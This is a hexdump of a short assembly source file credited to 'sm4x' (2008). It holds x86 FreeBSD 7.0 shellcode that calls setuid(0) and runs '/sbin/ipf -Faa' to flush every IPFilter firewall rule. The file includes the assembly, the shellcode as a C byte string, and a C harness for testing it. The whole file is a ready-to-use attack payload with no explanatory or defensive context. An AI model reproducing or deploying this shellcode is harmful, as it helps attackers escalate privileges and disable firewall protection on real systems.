00000000  3b 20 73 6d 34 78 20 2d  20 32 30 30 38 0d 0a 3b  |; sm4x - 2008..;|
00000010  20 73 65 74 75 69 64 28  30 29 3b 20 65 78 65 63  | setuid(0); exec|
00000020  76 65 28 22 2f 2f 73 62  69 6e 2f 69 70 66 22 2c  |ve("//sbin/ipf",|
00000030  20 7b 22 2f 2f 73 62 69  6e 2f 69 70 66 22 2c 20  | {"//sbin/ipf", |
00000040  22 2d 46 61 61 22 2c 20  30 7d 2c 20 30 29 3b 0d  |"-Faa", 0}, 0);.|
00000050  0a 3b 20 35 37 20 62 79  74 65 73 0d 0a 3b 20 46  |.; 57 bytes..; F|
00000060  72 65 65 42 53 44 20 37  2e 30 2d 52 45 4c 45 41  |reeBSD 7.0-RELEA|
00000070  53 45 0d 0a 0d 0a 67 6c  6f 62 61 6c 20 5f 73 74  |SE....global _st|
00000080  61 72 74 0d 0a 0d 0a 5f  73 74 61 72 74 3a 0d 0a  |art...._start:..|
00000090  6d 61 69 6e 3a 0d 0a 0d  0a 3b 20 2d 2d 2d 2d 2d  |main:....; -----|
000000a0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
000000b0  20 73 65 74 75 69 64 20  28 30 29 0d 0a 78 6f 72  | setuid (0)..xor|
000000c0  20 20 20 20 20 65 61 78  2c 20 65 61 78 0d 0a 78  |     eax, eax..x|
000000d0  6f 72 20 20 20 20 20 65  63 78 2c 20 65 63 78 0d  |or     ecx, ecx.|
000000e0  0a 70 75 73 68 20 20 20  20 65 61 78 0d 0a 70 75  |.push    eax..pu|
000000f0  73 68 20 20 20 20 20 20  20 20 65 61 78 0d 0a 6d  |sh        eax..m|
00000100  6f 76 20 20 20 20 20 61  6c 2c 20 30 78 31 37 0d  |ov     al, 0x17.|
00000110  0a 69 6e 74 20 20 20 20  20 30 78 38 30 0d 0a 3b  |.int     0x80..;|
00000120  20 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  | ---------------|
00000130  2d 2d 2d 2d 2d 2d 20 2d  46 61 61 0d 0a 78 6f 72  |------ -Faa..xor|
00000140  20 20 20 20 20 65 61 78  2c 20 65 61 78 0d 0a 70  |     eax, eax..p|
00000150  75 73 68 20 20 20 20 65  61 78 0d 0a 70 75 73 68  |ush    eax..push|
00000160  20 20 20 20 30 78 36 31  36 31 34 36 32 64 20 20  |    0x6161462d  |
00000170  20 20 20 20 3b 20 2d 46  61 61 0d 0a 6d 6f 76 20  |    ; -Faa..mov |
00000180  20 20 20 20 65 63 78 2c  20 65 73 70 0d 0a 0d 0a  |    ecx, esp....|
00000190  3b 20 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |; --------------|
000001a0  2d 2d 2d 2d 2d 2d 2d 20  73 65 74 75 70 20 2f 2f  |------- setup //|
000001b0  73 62 69 6e 2f 69 70 66  0d 0a 70 75 73 68 20 20  |sbin/ipf..push  |
000001c0  20 20 65 61 78 0d 0a 70  75 73 68 20 20 20 20 77  |  eax..push    w|
000001d0  6f 72 64 20 30 78 36 36  37 30 0d 0a 70 75 73 68  |ord 0x6670..push|
000001e0  20 20 20 20 30 78 36 39  32 66 36 65 36 39 0d 0a  |    0x692f6e69..|
000001f0  70 75 73 68 20 20 20 20  30 78 36 32 37 33 32 66  |push    0x62732f|
00000200  32 66 0d 0a 6d 6f 76 20  20 20 20 20 65 62 78 2c  |2f..mov     ebx,|
00000210  20 65 73 70 0d 0a 0d 0a  3b 20 2d 2d 2d 2d 2d 2d  | esp....; ------|
00000220  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00000230  20 61 72 72 61 79 20 73  65 74 75 70 0d 0a 70 75  | array setup..pu|
00000240  73 68 20 20 20 20 65 61  78 0d 0a 70 75 73 68 20  |sh    eax..push |
00000250  20 20 20 65 63 78 0d 0a  70 75 73 68 20 20 20 20  |   ecx..push    |
00000260  65 62 78 0d 0a 6d 6f 76  20 20 20 20 20 65 63 78  |ebx..mov     ecx|
00000270  2c 20 65 73 70 0d 0a 0d  0a 3b 20 2d 2d 2d 2d 2d  |, esp....; -----|
00000280  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00000290  2d 20 63 61 6c 6c 20 74  6f 20 65 78 65 63 76 65  |- call to execve|
000002a0  0d 0a 70 75 73 68 20 20  20 20 65 61 78 0d 0a 70  |..push    eax..p|
000002b0  75 73 68 20 20 20 20 65  63 78 0d 0a 70 75 73 68  |ush    ecx..push|
000002c0  20 20 20 20 65 62 78 0d  0a 0d 0a 6d 6f 76 20 20  |    ebx....mov  |
000002d0  20 20 20 61 6c 2c 20 30  78 33 62 0d 0a 70 75 73  |   al, 0x3b..pus|
000002e0  68 20 20 20 20 65 61 78  0d 0a 69 6e 74 20 20 20  |h    eax..int   |
000002f0  20 20 30 78 38 30 0d 0a  0d 0a 78 6f 72 20 20 20  |  0x80....xor   |
00000300  20 20 65 61 78 2c 20 65  61 78 0d 0a 70 75 73 68  |  eax, eax..push|
00000310  20 20 20 20 65 61 78 0d  0a 70 75 73 68 20 20 20  |    eax..push   |
00000320  20 65 61 78 0d 0a 69 6e  74 20 20 20 20 20 30 78  | eax..int     0x|
00000330  38 30 0d 0a 0d 0a 2f 2a  0d 0a 0d 0a 63 68 61 72  |80..../*....char|
00000340  20 63 6f 64 65 5b 5d 20  3d 20 22 5c 78 33 31 5c  | code[] = "\x31\|
00000350  78 63 30 5c 78 33 31 5c  78 63 39 5c 78 35 30 5c  |xc0\x31\xc9\x50\|
00000360  78 35 30 5c 78 62 30 5c  78 31 37 5c 78 63 64 5c  |x50\xb0\x17\xcd\|
00000370  78 38 30 22 0d 0a 20 20  20 20 20 20 20 20 20 20  |x80"..          |
00000380  20 20 20 20 22 5c 78 33  31 5c 78 63 30 5c 78 35  |    "\x31\xc0\x5|
00000390  30 5c 78 36 38 5c 78 32  64 5c 78 34 36 5c 78 36  |0\x68\x2d\x46\x6|
000003a0  31 5c 78 36 31 5c 78 38  39 5c 78 65 31 22 0d 0a  |1\x61\x89\xe1"..|
000003b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 22 5c  |              "\|
000003c0  78 35 30 5c 78 36 36 5c  78 36 38 5c 78 37 30 5c  |x50\x66\x68\x70\|
000003d0  78 36 36 5c 78 36 38 5c  78 36 39 5c 78 36 65 5c  |x66\x68\x69\x6e\|
000003e0  78 32 66 5c 78 36 39 22  0d 0a 20 20 20 20 20 20  |x2f\x69"..      |
000003f0  20 20 20 20 20 20 20 20  22 5c 78 36 38 5c 78 32  |        "\x68\x2|
00000400  66 5c 78 32 66 5c 78 37  33 5c 78 36 32 5c 78 38  |f\x2f\x73\x62\x8|
00000410  39 5c 78 65 33 5c 78 35  30 5c 78 35 31 5c 78 35  |9\xe3\x50\x51\x5|
00000420  33 22 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |3"..            |
00000430  20 20 22 5c 78 38 39 5c  78 65 31 5c 78 35 30 5c  |  "\x89\xe1\x50\|
00000440  78 35 31 5c 78 35 33 5c  78 62 30 5c 78 33 62 5c  |x51\x53\xb0\x3b\|
00000450  78 35 30 5c 78 63 64 5c  78 38 30 22 0d 0a 20 20  |x50\xcd\x80"..  |
00000460  20 20 20 20 20 20 20 20  20 20 20 20 22 5c 78 33  |            "\x3|
00000470  31 5c 78 63 30 5c 78 35  30 5c 78 35 30 5c 78 63  |1\xc0\x50\x50\xc|
00000480  64 5c 78 38 30 22 3b 0d  0a 0d 0a 69 6e 74 20 6d  |d\x80";....int m|
00000490  61 69 6e 28 69 6e 74 20  61 72 67 63 2c 20 63 68  |ain(int argc, ch|
000004a0  61 72 20 2a 2a 61 72 67  76 29 20 7b 0d 0a 20 20  |ar **argv) {..  |
000004b0  20 20 20 20 20 20 69 6e  74 20 28 2a 66 75 6e 63  |      int (*func|
000004c0  29 28 29 3b 0d 0a 20 20  20 20 20 20 20 20 70 72  |)();..        pr|
000004d0  69 6e 74 66 28 22 42 79  74 65 73 3a 20 25 64 5c  |intf("Bytes: %d\|
000004e0  6e 22 2c 20 73 69 7a 65  6f 66 28 63 6f 64 65 29  |n", sizeof(code)|
000004f0  29 3b 0d 0a 20 20 20 20  20 20 20 20 66 75 6e 63  |);..        func|
00000500  20 3d 20 28 69 6e 74 20  28 2a 29 28 29 29 20 63  | = (int (*)()) c|
00000510  6f 64 65 3b 0d 0a 7d 0d  0a 0d 0a 2a 2f           |ode;..}....*/|
0000051d
